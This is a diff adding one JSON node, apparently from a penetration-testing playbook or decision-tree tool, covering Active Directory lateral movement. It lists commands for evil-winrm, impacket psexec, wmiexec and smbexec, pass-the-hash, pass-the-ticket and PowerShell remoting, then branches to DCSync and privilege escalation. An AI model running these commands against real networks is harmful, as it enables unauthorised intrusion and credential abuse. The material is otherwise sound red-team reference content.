@@ -1,0 +1,18 @@
+{
+  "id": "lateral_movement",
+  "phase": "AD",
+  "title": "Lateral Movement",
+  "body": "Move between machines with creds, hashes, or Kerberos tickets. impacket suite covers everything — no MSF console needed.",
+  "cmd": "# evil-winrm (WinRM 5985/5986)\nevil-winrm -i $target -u admin -p 'pass'\nevil-winrm -i $target -u admin -H NTLM_HASH\n\n# psexec (requires admin + file write to ADMIN$)\nimpacket-psexec domain/admin:'pass'@$target\nimpacket-psexec domain/admin@$target -hashes :NTLM_HASH\n\n# wmiexec (stealthier — no service creation)\nimpacket-wmiexec domain/admin:'pass'@$target\n\n# smbexec\nimpacket-smbexec domain/admin:'pass'@$target\n\n# Pass-the-ticket\nexport KRB5CCNAME=ticket.ccache\nimpacket-psexec -k -no-pass domain/admin@dc01.domain.com\n\n# PowerShell remoting\nEnter-PSSession -ComputerName $target -Credential domain\\admin",
+  "warn": null,
+  "choices": [
+    {
+      "label": "On DC — DCSync everything",
+      "next": "dcsync"
+    },
+    {
+      "label": "On member server — privesc further",
+      "next": "windows_post_exploit"
+    }
+  ]
+}
